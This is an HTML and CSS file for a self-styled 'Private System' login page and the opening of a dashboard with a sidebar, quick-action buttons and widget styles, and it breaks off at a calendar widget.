<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Private System</title>
  <style>
    /* --- Global Styles --- */
    :root {
      --primary-color: #ff914d; /* Orange/Carrot */
      --primary-hover-color: #e6823e;
      --secondary-color: #ffd966; /* Yellow */
      --background-dark: #1a1a1a;
      --background-medium: #2a2a2a;
      --background-light: #333;
      --text-color-light: #f9f2dc;
      --text-color-dark: #000;
      --accent-color: var(--primary-color); /* Default accent */
      --error-color: #ff4c4c;
      --sidebar-width: 250px;
      --sidebar-collapsed-width: 70px;
      --transition-speed: 0.3s;
      --border-radius: 8px;
      --box-shadow-sm: 0 2px 5px rgba(0,0,0,0.1);
      --box-shadow-md: 0 5px 15px rgba(0,0,0,0.2);
      --box-shadow-lg: 0 10px 25px rgba(0,0,0,0.3);
    }

    /* --- Preloader Styles --- */
    #preloader {
      position: fixed;
      top: 0; left: 0; width: 100%; height: 100%;
      background: rgba(0, 0, 0, 0.95);
      display: flex; justify-content: center; align-items: center;
      z-index: 9999;
      color: #fff; font-family: 'Courier New', monospace; font-size: 2em;
      flex-direction: column;
      opacity: 1;
      transition: opacity var(--transition-speed) ease-out;
    }
    .preloader-box {
      display: flex; flex-direction: column; align-items: center; justify-content: center;
      border: 3px solid white; border-radius: 15px;
      box-shadow: 0 0 25px white;
      padding: 30px 40px;
      background: #111;
      animation: pulseBorder 2s infinite ease-in-out;
    }
    @keyframes pulseBorder { 0% { box-shadow: 0 0 25px white; } 50% { box-shadow: 0 0 40px var(--primary-color); } 100% { box-shadow: 0 0 25px white; } }
    @keyframes flashPreloaderText { 0%, 100% { opacity: 1; color: var(--primary-color); } 50% { opacity: 0.7; color: #eee; } }
    .preloader-text { animation: flashPreloaderText 2s infinite alternate; }

    /* --- Notification Styles --- */
    #notificationArea {
      position: fixed;
      bottom: 20px; right: 20px;
      z-index: 10000;
      display: flex; flex-direction: column; gap: 10px;
      align-items: flex-end;
    }
    .notification {
      background: var(--primary-color); color: #000;
      padding: 12px 20px; border-radius: var(--border-radius);
      box-shadow: var(--box-shadow-md);
      opacity: 0; transform: translateY(20px);
      animation: slideInFromBottom 0.5s forwards, fadeOut 0.5s forwards 5s;
      min-width: 250px; white-space: nowrap; text-align: center;
      font-weight: bold;
      border: 1px solid #cc743b;
    }
    @keyframes slideInFromBottom { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
    @keyframes fadeOut { from { opacity: 1; } to { opacity: 0; transform: translateY(-20px); } }

    /* --- Login System Styles --- */
    body.login-body {
      margin: 0; padding: 0;
      background: #000; color: #fff;
      display: flex; justify-content: center; align-items: center;
      height: 100vh; overflow: hidden;
    }
    .login-box {
      background: rgba(15, 15, 15, 0.9); border-radius: 20px;
      border: 3px solid var(--primary-color);
      box-shadow: 0 0 20px rgba(255, 145, 77, 0.5);
      width: 380px; padding: 35px 30px;
      text-align: center; position: relative;
      transition: border-color var(--transition-speed), box-shadow var(--transition-speed), transform var(--transition-speed);
      backdrop-filter: blur(8px);
    }
    .login-box:hover { border-color: #fff; box-shadow: 0 0 30px #fff; transform: translateY(-5px); }
    .login-box h2 {
      font-size: 2em; margin-bottom: 30px;
      font-family: 'Courier New', monospace; letter-spacing: 2px;
      text-shadow: 0 0 12px var(--primary-color);
    }
    .login-box input[type="text"], .login-box input[type="password"] {
      width: 100%; padding: 15px; margin-bottom: 20px;
      background: #1c1c1c; border: 1px solid #333; color: white;
      border-radius: 10px; font-size: 1.1em;
      transition: all var(--transition-speed) ease; outline: none;
    }
    .login-box input[type="text"]:focus, .login-box input[type="password"]:focus {
      border-color: var(--primary-color);
      box-shadow: 0 0 10px rgba(255, 145, 77, 0.7);
      background: #2a2a2a;
    }
    .login-box label {
      display: flex; align-items: center; font-size: 0.95em;
      margin-bottom: 18px; gap: 10px; cursor: pointer; color: #ccc;
    }
    #showPassword:checked + span { color: var(--primary-color); font-weight: bold; }
    .login-box button {
      width: 100%; padding: 15px; background-color: var(--primary-color); color: white;
      font-size: 1.15em; border: none; border-radius: 10px; cursor: pointer;
      transition: background-color var(--transition-speed), transform 0.2s, box-shadow var(--transition-speed);
      font-weight: bold; letter-spacing: 1px;
    }
    .login-box button:hover {
      background-color: var(--primary-hover-color);
      box-shadow: 0 0 15px rgba(255, 145, 77, 0.7);
      transform: translateY(-2px);
    }
    .attempt-counter, .error-message {
      margin-top: 15px; font-size: 0.95em;
      color: var(--error-color); min-height: 20px;
    }
    .popup {
      display: none; position: absolute;
      top: 50%; left: 50%; width: 360px; padding: 30px;
      transform: translate(-50%, -50%);
      background: rgba(20, 20, 20, 0.95); border: 3px solid var(--primary-color);
      border-radius: 15px;
      box-shadow: 0 0 25px rgba(255, 145, 77, 0.7);
      z-index: 10;
      backdrop-filter: blur(8px);
      text-align: center;
    }
    .popup p { margin-bottom: 20px; font-size: 1.1em; color: #ddd; }
    .popup input { margin-bottom: 20px; padding: 12px; width: calc(100% - 2px); border: 1px solid #444; }
    .popup button {
      padding: 12px 25px; background-color: var(--primary-color); color: white;
      border: none; border-radius: var(--border-radius); cursor: pointer;
      transition: background-color var(--transition-speed), transform 0.2s;
    }
    .popup button:hover { background-color: var(--primary-hover-color); transform: translateY(-1px); }

    /* --- Dashboard Body & Layout --- */
    body.dashboard-body {
      font-family: 'Montserrat', sans-serif;
      background-color: var(--background-dark);
      color: var(--text-color-light);
      padding: 0; display: flex;
      overflow: hidden;
    }
    body.dashboard-body.light-theme {
      background-color: var(--secondary-color);
      color: var(--text-color-dark);
    }

    /* --- Sidebar --- */
    #sidebar {
      width: var(--sidebar-width);
      background-color: var(--background-medium);
      color: #ccc;
      display: flex; flex-direction: column;
      height: 100vh;
      position: fixed; left: 0; top: 0; z-index: 1001;
      box-shadow: var(--box-shadow-lg);
      transition: width var(--transition-speed) ease, background-color var(--transition-speed);
      overflow-x: hidden;
    }
    body.dashboard-body.light-theme #sidebar {
        background-color: var(--secondary-color); color: #666;
        border-right: 1px solid rgba(0,0,0,0.1);
    }
    #sidebar.collapsed { width: var(--sidebar-collapsed-width); }
    #sidebar.collapsed .sidebar-item span,
    #sidebar.collapsed .sidebar-title,
    #sidebar.collapsed #sidebarToggle span { display: none; }
    #sidebar.collapsed .sidebar-item i { margin-right: 0; font-size: 1.4em; }
    #sidebar.collapsed .sidebar-footer { text-align: center; }

    .sidebar-header {
      padding: 20px 15px; text-align: center;
      border-bottom: 1px solid #444; margin-bottom: 20px;
      transition: padding var(--transition-speed) ease;
    }
    body.dashboard-body.light-theme .sidebar-header { border-bottom: 1px solid rgba(0,0,0,0.1); }
    .sidebar-header h3 {
      margin: 0; font-size: 1.6em;
      color: var(--accent-color); font-family: 'Courier New', monospace; letter-spacing: 1px;
      text-shadow: 0 0 5px rgba(255, 145, 77, 0.5);
    }
    .sidebar-header span { font-size: 0.8em; color: #bbb; display: block; margin-top: 5px; }
    body.dashboard-body.light-theme .sidebar-header span { color: #888; }

    .sidebar-nav ul { list-style: none; padding: 0; margin: 0; flex-grow: 1; }
    .sidebar-item {
      display: flex; align-items: center;
      padding: 12px 20px; cursor: pointer;
      transition: background-color var(--transition-speed), color var(--transition-speed), padding var(--transition-speed) ease;
      margin: 2px 15px;
      border-radius: var(--border-radius);
      font-size: 1em; text-decoration: none; color: inherit;
    }
    .sidebar-item i {
      font-size: 1.2em; margin-right: 15px;
      transition: margin-right var(--transition-speed) ease;
      min-width: 30px; text-align: center;
    }
    .sidebar-item:hover { background-color: #3a3a3a; color: #fff; }
    body.dashboard-body.light-theme .sidebar-item:hover { background-color: #e6b800; color: #000; }
    .sidebar-item.active {
      background-color: var(--accent-color);
      color: #fff; font-weight: bold;
    }
    .sidebar-item.active:hover { background-color: var(--primary-hover-color); }

    .sidebar-footer {
      padding: 15px 20px; border-top: 1px solid #444; margin-top: 20px;
      transition: padding var(--transition-speed) ease;
    }
    body.dashboard-body.light-theme .sidebar-footer { border-top: 1px solid rgba(0,0,0,0.1); }

    #sidebarToggle {
      background: none; border: none;
      color: #ccc; font-size: 1.8em; cursor: pointer;
      display: flex; align-items: center; justify-content: center;
      width: 100%; padding: 10px 0;
      transition: color var(--transition-speed), transform 0.3s ease;
    }
    #sidebarToggle:hover { color: #fff; transform: rotate(180deg); }
    body.dashboard-body.light-theme #sidebarToggle { color: #666; }
    body.dashboard-body.light-theme #sidebarToggle:hover { color: #000; }
    .sidebar-item.logout-item { /* Special styling for logout */
        background-color: transparent !important;
        color: #ff4c4c !important; /* Error color for logout */
    }
    .sidebar-item.logout-item:hover {
        background-color: rgba(255, 76, 76, 0.2) !important;
        color: #ff4c4c !important;
    }

    /* --- Main Content Area --- */
    #mainContent {
      flex-grow: 1;
      margin-left: var(--sidebar-width);
      padding: 20px;
      transition: margin-left var(--transition-speed) ease;
      overflow-y: auto;
      height: 100vh;
      box-sizing: border-box;
    }
    #mainContent.collapsed { margin-left: var(--sidebar-collapsed-width); }

    /* --- Dashboard Header --- */
    .dashboard-header {
      display: flex; justify-content: space-between; align-items: center;
      background: var(--primary-color);
      padding: 18px 30px;
      border-radius: 12px;
      color: #000;
      margin-bottom: 30px;
      box-shadow: var(--box-shadow-md);
      transition: background-color var(--transition-speed);
    }
    body.dashboard-body.light-theme .dashboard-header { background: var(--secondary-color); }
    .dashboard-header h1 {
      font-size: 28px; margin: 0; letter-spacing: 1px;
      text-shadow: 0 0 8px rgba(0,0,0,0.2);
    }
    .user-info { font-weight: bold; font-size: 1.1em; color: #111; }
    body.dashboard-body.light-theme .user-info { color: #333; }
    .version-box {
      background: var(--secondary-color);
      padding: 10px 18px; border-radius: var(--border-radius);
      color: #000; font-weight: bold; font-size: 0.95em;
      box-shadow: inset 0 0 10px rgba(0,0,0,0.1);
    }

    /* --- Widgets & Content Layout --- */
    .quick-bar {
      display: flex; justify-content: center;
      gap: 12px; margin-bottom: 30px;
      flex-wrap: wrap; padding: 10px;
      background: rgba(42, 42, 42, 0.7); border-radius: 10px;
      backdrop-filter: blur(5px);
    }
    .quick-bar button {
      background-color: var(--primary-color); border: none;
      padding: 12px 18px; border-radius: var(--border-radius);
      color: black; font-weight: bold; cursor: pointer;
      transition: background-color var(--transition-speed), transform 0.2s, box-shadow var(--transition-speed);
      min-width: 130px; white-space: nowrap; font-size: 0.95em; text-align: center;
    }
    .quick-bar button:hover {
      background-color: var(--primary-hover-color);
      transform: translateY(-2px);
      box-shadow: 0 0 15px rgba(255, 176, 114, 0.7);
    }
    #panicBtn { background: var(--error-color) !important; color: white !important; border: 2px solid var(--error-color); }
    #panicBtn:hover { background: #d13a3a !important; border-color: #d13a3a; }

    .announcement-bar {
      width: 100%; background-color: var(--primary-color); color: black;
      font-weight: bold; padding: 12px 0; overflow: hidden; position: relative;
      border-radius: var(--border-radius); box-sizing: border-box;
      margin-bottom: 30px; user-select: none;
      height: 40px; line-height: 16px; text-align: center;
      display: flex; align-items: center; justify-content: center; font-size: 1em;
    }
    body.dashboard-body.light-theme .announcement-bar { background-color: var(--secondary-color); }
    .announcement-bar span {
      display: inline-block; white-space: nowrap; position: absolute;
      will-change: transform; animation: scrollLeft 15s linear infinite;
      padding-left: 100%;
    }
    @keyframes scrollLeft { from { transform: translateX(0%); } to { transform: translateX(-100%); } }

    .dashboard-layout {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
      gap: 20px; margin-bottom: 30px;
    }
    .widget {
      background-color: var(--background-medium); padding: 20px;
      border-radius: 12px; box-shadow: var(--box-shadow-sm);
      transition: transform var(--transition-speed), box-shadow var(--transition-speed);
    }
    .widget:hover { transform: translateY(-5px); box-shadow: var(--box-shadow-md); }
    body.dashboard-body.light-theme .widget { background-color: var(--secondary-color); box-shadow: var(--box-shadow-sm); }
    body.dashboard-body.light-theme .widget:hover { box-shadow: var(--box-shadow-md); }
    .widget h2 {
      font-size: 20px; margin-top: 0; margin-bottom: 15px;
      color: var(--accent-color); border-bottom: 2px solid var(--accent-color); padding-bottom: 8px;
      display: inline-block;
    }
    body.dashboard-body.light-theme .widget h2 { color: var(--primary-color); border-color: var(--primary-color); }
    .widget p, .widget ul { font-size: 14px; line-height: 1.5; }
    .update-entry { background: #40210f; padding: 10px; margin-top: 8px; border-radius: var(--border-radius); color: #ffccb3; font-size: 0.9em; border-left: 4px solid var(--primary-color); transition: background-color var(--transition-speed); }
    .update-entry:hover { background: #4a2411; }
    body.dashboard-body.light-theme .update-entry { background: #ffd999; }
    body.dashboard-body.light-theme .update-entry:hover { background: #ffe0a6; }

    /* Calendar */
    .calendar {
      display: grid; grid-template-columns: repeat(7, 1fr);
      gap: 5px; margin-top: 10px; text-align: center; font-size: 12px;
    }
    .calendar div {
      padding: 8px; background: var(--background-light); border-radius: var(--border-radius);
      transition: background-color var(--transition-speed), transform 0.2s;
    }
    .calendar div:not(.today):hover { background: #444; transform: scale(0.95); }
    .today { background: var(--primary-color) !important; font-weight: bold; color: black; border: 2px solid white; transform: scale(1.1); }
    .today:hover { background: var(--primary-hover-color) !important; }
    body.dashboard-body.light-theme .calendar div { background: #ffd966; }
    body.dashboard-body.light-theme .calendar div:not(.today):hover { background: #ffe077; }
    body.dashboard-body.light-theme .today { background: var(--primary-color) !important; color: #000; }
    body.dashboard-body.light-theme .today:hover { background: var(--primary-hover-color) !important; }

    /* Motivation Box */
    .motivation-box {
      background-color: var(--background-light); color: var(--secondary-color);
      font-style: italic; font-size: 16px; box-shadow: var(--box-shadow-sm);
      display: flex; align-items: center; justify-content: center; min-height: 120px;
      text-align: center; font-weight: 500;
    }
    body.dashboard-body.light-theme .motivation-box { background-color: #fff3cc; color: #994d00; box-shadow: var(--box-shadow-sm); }

    /* System Status Widget */
    .system-status-widget .status-item {
      display: flex; justify-content: space-between; align-items: center;
      margin-bottom: 10px; padding-bottom: 8px;
      border-bottom: 1px dashed #444; font-size: 0.95em;
    }
    body.dashboard-body.light-theme .system-status-widget .status-item { border-bottom: 1px dashed #e0c673; }
    .system-status-widget .status-item:last-child { border-bottom: none; margin-bottom: 0; padding-bottom: 0; }
    .status-label { color: #bbb; }
    .status-value { color: var(--accent-color); font-weight: bold; }
    .status-value.critical { color: var(--error-color); }
    body.dashboard-body.light-theme .status-label { color: #666; }

    /* Activity Log Widget */
    .activity-log-widget .activity-log {
      max-height: 150px; /* Scrollable */
      overflow-y: auto;
      padding-right: 10px; /* Space for scrollbar */
    }
    .activity-log .log-entry {
      font-size: 0.9em; margin-bottom: 8px;
      color: #bbb; display: flex; align-items: center; gap: 10px;
    }
    .activity-log .log-entry i { color: var(--primary-color); }
    body.dashboard-body.light-theme .activity-log .log-entry { color: #888; }
    body.dashboard-body.light-theme .activity-log .log-entry i { color: var(--primary-color); }

    /* --- Info Panel Styles (Shared by many sections) --- */
    .info-panel {
      display: none; /* Hidden by default */
      background-color: var(--background-medium);
      padding: 25px; border-radius: 12px;
      margin-top: 20px; box-shadow: var(--box-shadow-sm);
      animation: fadeInSection 0.5s ease-out;
    }
    body.dashboard-body.light-theme .info-panel { background-color: var(--secondary-color); color: #000; }
    .info-panel h2 {
      color: var(--primary-color); margin-top: 0; margin-bottom: 20px;
      border-bottom: 2px solid var(--primary-color); padding-bottom: 10px;
      display: inline-block;
    }
    body.dashboard-body.light-theme .info-panel h2 { color: var(--primary-color); border-color: var(--primary-color); }

    .wifi-grid, .links-list, .exploit-buttons, .bypass-buttons, .handbook-buttons, .school-info-grid, .settings-grid, .system-tools-grid {
      display: grid; gap: 10px; margin-top: 15px;
    }
    .wifi-grid { grid-template-columns: repeat(8, 1fr); }
    .links-list { grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); }
    .exploit-buttons { grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); }
    .bypass-buttons { grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); }
    .handbook-buttons { grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); }
    .school-info-grid { grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); }
    .settings-grid { grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); }
    .system-tools-grid { grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); }

    .wifi-entry {
      display: grid; grid-template-columns: repeat(8, 1fr);
      gap: 10px; margin-bottom: 10px;
    }
    .wifi-grid div, .wifi-entry div {
      padding: 10px; background: var(--background-light); border-radius: var(--border-radius);
      text-align: center; font-weight: bold; font-size: 0.9em;
    }
    body.dashboard-body.light-theme .wifi-grid div, body.dashboard-body.light-theme .wifi-entry div {
      background: #e6b800; color: #000;
    }
    .wifi-entry div { background: #40210f; }
    body.dashboard-body.light-theme .wifi-entry div { background: #ffd999; }

    .handbook-buttons button, .handbook-buttons a, .links-list a, .exploit-buttons a, .bypass-buttons button {
      display: flex; /* For centering text */
      align-items: center; justify-content: center;
      background-color: var(--primary-color); border: none;
      padding: 12px; border-radius: var(--border-radius);
      color: black; font-weight: bold; cursor: pointer;
      transition: background-color var(--transition-speed), transform 0.2s;
      text-decoration: none; font-size: 0.95em;
    }
    .handbook-buttons button:hover, .handbook-buttons a:hover, .links-list a:hover, .exploit-buttons a:hover, .bypass-buttons button:hover {
      background-color: var(--primary-hover-color);
      transform: translateY(-2px);
    }

    .coming-soon {
      background: var(--background-light); padding: 15px; border-radius: var(--border-radius);
      margin-top: 15px; text-align: center; font-weight: bold; font-size: 1.1em;
      color: #ffccb3;
    }
    body.dashboard-body.light-theme .coming-soon { background: #ffd999; color: #994d00; }

    .info-text {
      background: var(--background-light); padding: 15px; border-radius: var(--border-radius);
      margin-top: 15px; line-height: 1.6; font-size: 0.95em;
    }
    body.dashboard-body.light-theme .info-text { background: #ffd999; }

    .school-info-item {
      background: var(--background-light); padding: 12px; border-radius: var(--border-radius);
      transition: background-color var(--transition-speed);
    }
    .school-info-item:hover { background: #4a2411; }
    body.dashboard-body.light-theme .school-info-item { background: #ffd999; }
    body.dashboard-body.light-theme .school-info-item:hover { background: #ffe0a6; }
    .school-info-label {
      font-weight: bold; color: var(--primary-color);
      margin-bottom: 5px; font-size: 0.95em;
    }
    body.dashboard-body.light-theme .school-info-label { color: var(--primary-color); }

    .ipad-options button {
      flex: 1;
      background-color: var(--primary-color); border: none;
      padding: 12px; border-radius: var(--border-radius);
      color: black; font-weight: bold; cursor: pointer;
      transition: background-color var(--transition-speed), transform 0.2s;
    }
    .ipad-options button:hover {
      background-color: var(--primary-hover-color);
      transform: translateY(-2px);
    }
    .ipad-content, .bypass-content {
      display: none;
      background: var(--background-light); padding: 15px; border-radius: var(--border-radius);
      margin-top: 15px;
    }
    body.dashboard-body.light-theme .ipad-content, body.dashboard-body.light-theme .bypass-content {
      background: #ffd999;
    }

    /* --- System Tools Section --- */
    .system-tools-section {
      background-color: var(--background-medium);
      padding: 25px; border-radius: 12px;
      box-shadow: var(--box-shadow-sm);
      animation: fadeInSection 0.5s ease-out;
    }
    body.dashboard-body.light-theme .system-tools-section {
      background-color: var(--secondary-color);
    }
    .system-tools-section h2 {
      font-size: 20px; color: var(--primary-color);
      border-bottom: 2px solid var(--primary-color); padding-bottom: 10px;
      display: inline-block; margin-top: 0;
    }
    body.dashboard-body.light-theme .system-tools-section h2 {
      color: var(--primary-color); border-color: var(--primary-color);
    }
    .system-tools-section .widget-container { /* Wrapper for better grid layout */
      display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
      gap: 10px; margin-top: 20px;
    }
    .system-tools-section button, .system-tools-section a {
      background-color: var(--background-light); border: none;
      padding: 12px; border-radius: var(--border-radius);
      color: var(--text-color-light);
      font-weight: bold; cursor: pointer;
      transition: background-color var(--transition-speed), transform 0.2s, color var(--transition-speed);
      text-align: center; font-size: 0.9em;
      text-decoration: none; white-space: normal; height: 60px;
      display: flex; align-items: center; justify-content: center;
    }
    body.dashboard-body.light-theme .system-tools-section button, body.dashboard-body.light-theme .system-tools-section a {
      background-color: #e6b800; color: #000;
    }
    .system-tools-section button:hover, .system-tools-section a:hover {
      background-color: #4a4a4a; color: var(--primary-color); transform: translateY(-2px);
    }
    body.dashboard-body.light-theme .system-tools-section button:hover, body.dashboard-body.light-theme .system-tools-section a:hover {
      background-color: #ffdb4d; color: var(--primary-color);
    }

    /* --- Settings Panel --- */
    #settingsPanel {
      display: none; /* Hidden by default */
      background-color: var(--background-medium);
      padding: 25px; border-radius: 12px;
      margin-top: 20px; box-shadow: var(--box-shadow-sm);
      animation: fadeInSection 0.5s ease-out;
      flex: 2 1 500px; /* Give settings more flex space */
    }
    body.dashboard-body.light-theme #settingsPanel { background-color: var(--secondary-color); color: #000; }
    #settingsPanel h2 {
      color: var(--primary-color); margin-top: 0; margin-bottom: 25px;
      border-bottom: 2px solid var(--primary-color); padding-bottom: 10px;
      display: inline-block;
    }
    body.dashboard-body.light-theme #settingsPanel h2 {
      color: var(--primary-color); border-color: var(--primary-color);
    }

    .settings-section {
      margin-bottom: 30px; padding-bottom: 20px;
      border-bottom: 1px dashed #444;
    }
    body.dashboard-body.light-theme .settings-section { border-bottom: 1px dashed #e0c673; }
    .settings-section:last-child { border-bottom: none; margin-bottom: 0; padding-bottom: 0; }
    .settings-section h3 {
      font-size: 1.4em; color: #ffbf80;
      margin-bottom: 15px; letter-spacing: 0.5px;
    }
    body.dashboard-body.light-theme .settings-section h3 { color: #b36b00; }

    .setting-item {
      background: #333; padding: 15px; border-radius: var(--border-radius);
      display: flex; flex-direction: column; justify-content: space-between;
      transition: background-color var(--transition-speed);
    }
    .setting-item:hover { background: #4a4a4a; }
    body.dashboard-body.light-theme .setting-item { background: #ffd999; }
    body.dashboard-body.light-theme .setting-item:hover { background: #ffe0a6; }

    .setting-label {
      font-weight: bold; color: var(--primary-color);
      margin-bottom: 10px; font-size: 0.95em; display: block;
    }
    body.dashboard-body.light-theme .setting-label { color: var(--primary-color); }

    .setting-input, .textarea-setting {
      width: 100%; padding: 10px; border: 1px solid #555; border-radius: 5px;
      background: #1c1c1c; color: #fff; font-size: 0.9em;
      transition: all var(--transition-speed) ease; box-sizing: border-box;
    }
    body.dashboard-body.light-theme .setting-input, body.dashboard-body.light-theme .textarea-setting {
      background: #fff; border-color: #e6b800; color: #000;
    }
    .setting-input:focus, .textarea-setting:focus {
      border-color: var(--primary-color);
      box-shadow: 0 0 8px rgba(255, 145, 77, 0.7); outline: none;
    }
    .textarea-setting { resize: vertical; min-height: 80px; }

    .color-picker-wrapper {
      display: flex; align-items: center; gap: 10px;
    }
    .color-picker-wrapper input[type="color"] {
      width: 40px; height: 40px; border: none; border-radius: 5px; background: transparent; cursor: pointer; padding: 0; overflow: hidden;
    }
    .color-picker-wrapper input[type="color"]::-webkit-color-swatch-wrapper { padding: 0; }
    .color-picker-wrapper input[type="color"]::-webkit-color-swatch { border: 1px solid #555; border-radius: 5px; }
    body.dashboard-body.light-theme .color-picker-wrapper input[type="color"]::-webkit-color-swatch { border-color: #e6b800; }

    .checkbox-setting {
      display: flex; align-items: center; gap: 10px;
      margin-top: 10px;
    }
    .checkbox-setting input[type="checkbox"] {
      transform: scale(1.2); cursor: pointer; accent-color: var(--primary-color);
    }
    body.dashboard-body.light-theme .checkbox-setting input[type="checkbox"] { accent-color: var(--primary-color); }
    .checkbox-setting label { font-size: 0.95em; color: #ccc; margin-bottom: 0; cursor: pointer; }
    body.dashboard-body.light-theme .checkbox-setting label { color: #333; }

    .slider-setting { margin-top: 10px; }
    .slider-setting label {
      display: block; margin-bottom: 5px; font-size: 0.9em; color: #ccc;
    }
    body.dashboard-body.light-theme .slider-setting label { color: #333; }
    .setting-input[type="range"] {
      width: calc(100% - 10px); accent-color: var(--primary-color);
    }
    body.dashboard-body.light-theme .setting-input[type="range"] { accent-color: var(--primary-color); }
    .slider-setting span { font-size: 0.85em; color: #888; } /* For displaying value next to slider */

    .settings-button {
      background-color: var(--primary-color); color: white;
      border: none; padding: 10px 18px; border-radius: var(--border-radius);
      cursor: pointer; transition: background-color var(--transition-speed), transform 0.2s;
      font-weight: bold; margin-top: 15px; font-size: 0.95em;
    }
    .settings-button:hover { background-color: var(--primary-hover-color); transform: translateY(-2px); }
    
    /* Reminder styles */
    #reminderInputDiv {
      display: flex; gap: 10px; align-items: center; flex-wrap: wrap;
    }
    #reminderInputDiv input[type="text"], #reminderInputDiv input[type="datetime-local"] {
      flex-grow: 1; min-width: 150px;
    }
    #reminderList {
      list-style: none; padding: 0; margin-top: 15px;
      max-height: 150px; overflow-y: auto; padding-right: 10px;
    }
    #reminderList li {
      background: #333; padding: 10px; border-radius: var(--border-radius);
      margin-bottom: 8px; display: flex; justify-content: space-between;
      align-items: center; border-left: 4px solid var(--primary-color); font-size: 0.9em;
    }
    body.dashboard-body.light-theme #reminderList li { background: #ffd999; border-left-color: var(--primary-color); }
    #reminderList li button {
      background: var(--error-color); color: white; border: none;
      padding: 5px 10px; border-radius: 4px; cursor: pointer; font-size: 0.8em;
      transition: background-color 0.2s;
    }
    #reminderList li button:hover { background: #d13a3a; }

    /* Canvas */
    #canvasContainer {
      display: none; /* Hidden by default, shown via sidebar link */
      background-color: var(--background-medium);
      padding: 25px; border-radius: 12px;
      box-shadow: var(--box-shadow-sm);
      animation: fadeInSection 0.5s ease-out;
    }
    body.dashboard-body.light-theme #canvasContainer { background-color: var(--secondary-color); }
    #canvasContainer h2 {
      font-size: 20px; color: var(--primary-color);
      border-bottom: 2px solid var(--primary-color); padding-bottom: 10px;
      display: inline-block; margin-top: 0;
    }
    body.dashboard-body.light-theme #canvasContainer h2 {
      color: var(--primary-color); border-color: var(--primary-color);
    }
    #notesCanvas {
      border: 2px solid var(--primary-color); border-radius: 12px;
      background: #111; cursor: crosshair; touch-action: none;
    }
    body.dashboard-body.light-theme #notesCanvas {
        background: #fff; border-color: var(--primary-color);
    }
    #canvasControls {
      margin-top: 15px; display: flex; justify-content: center; gap: 15px;
    }
    #canvasControls button {
      background-color: var(--primary-color); border: none;
      padding: 10px 16px; border-radius: var(--border-radius);
      color: black; font-weight: bold; cursor: pointer;
      transition: background-color var(--transition-speed), transform 0.2s;
    }
    #canvasControls button:hover {
      background-color: var(--primary-hover-color);
      transform: translateY(-2px);
    }

    @keyframes fadeInSection { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    
  </style>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"> <!-- Font Awesome -->
  <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>

</head>
<body class="login-body" id="bodyElement">

  <!-- Preloader -->
  <div id="preloader">
    <div class="preloader-box">
      <div class="preloader-text" id="preloaderText">Initializing System..</div>
    </div>
  </div>

  <!-- Login System -->
  <div class="login-box" id="loginBox">
    <h2>𝙋𝙧𝙞𝙫𝙖𝙩𝙚 𝙎𝙮𝙨𝙩𝙚𝙢</h2>
    <input type="text" id="username" placeholder="Enter Username..." autocomplete="off" />
    <input type="password" id="password" placeholder="Enter Password..." autocomplete="off" />
    <input type="text" id="userID" placeholder="Enter User Identifier..." autocomplete="off" />

    <label for="showPassword">
      <input type="checkbox" id="showPassword" />
      <span>Show Password</span>
    </label>

    <button id="submitBtn">Submit</button>

    <div class="error-message" id="errorMsg"></div>
    <div class="attempt-counter" id="attemptsText">Attempts Left: 5</div>

    <!-- Reset Popup -->
    <div class="popup" id="resetPopup" tabindex="-1" aria-hidden="true">
      <p>Too many failed attempts.</p>
      <input type="password" id="resetField" placeholder="Enter Reset Code" autocomplete="off" />
      <button id="resetBtn">Reset Counter</button>
    </div>
  </div>

  <!-- Dashboard -->
  <div id="dashboard" style="display: none; width: 100%; height: 100vh; display: flex;">
    <!-- Sidebar -->
    <aside id="sidebar">
      <div class="sidebar-header">
        <h3>Private OS</h3>
        <span id="loggedInUserDisplay">User - Beta.user</span>
      </div>
      <nav class="sidebar-nav">
        <ul>
          <li><a href="#overview" class="sidebar-item active" data-section="overview"><i class="fas fa-tachometer-alt"></i><span>Overview</span></a></li>
          <li><a href="#systemTools" class="sidebar-item" data-section="systemTools"><i class="fas fa-tools"></i><span>System Tools</span></a></li>
          <li><a href="#notes" class="sidebar-item" data-section="notes"><i class="fas fa-sticky-note"></i><span>Notes</span></a></li>
          <li><a href="#infoPanelsContainer" class="sidebar-item" data-section="infoPanels"><i class="fas fa-info-circle"></i><span>Info Panels</span></a></li>
          <li><a href="#settingsPanel" class="sidebar-item" data-section="settings"><i class="fas fa-cog"></i><span>Settings</span></a></li>
        </ul>
      </nav>
      <div class="sidebar-footer">
        <button id="sidebarToggle"><i class="fas fa-angle-double-left"></i></button>
        <a href="#" id="logoutBtn" class="sidebar-item logout-item"><i class="fas fa-sign-out-alt"></i><span>Log Out</span></a>
      </div>
    </aside>

    <!-- Main Content Area -->
    <main id="mainContent">
      <!-- Header -->
      <div class="dashboard-header" id="dashboardHeader">
        <div>
          <h1>Private Dashboard GUI</h1>
          <div class="user-info">ID: <span id="loggedInID">281573</span></div>
        </div>
        <div class="version-box">Version 1.5.7</div>
      </div>

      <!-- Overview Section -->
      <section id="overview" class="content-section">
        <div class="quick-bar">
          <button id="sessionTime">⏳ Session Time: 00:00:00</button>
          <button id="realTimeClock">🕒 --:--:--</button>
          <button id="realDate">📅 --</button>
          <button id="screenshotBtn">📸 Screenshot</button>
          <button id="themeToggle">🌙 Dark Mode</button>
          <button id="zoomInBtn">➕ Zoom In</button>
          <button id="zoomOutBtn">➖ Zoom Out</button>
          <button id="fixIssuesBtn">🛠️ Fix Issues</button>
        </div>

        <div class="announcement-bar">
          <span>🚨 System stability confirmed. All modules are operating within optimal parameters. 🚨</span>
        </div>

        <div class="dashboard-layout">
          <!-- Calendar Widget -->
          <div class="widget">
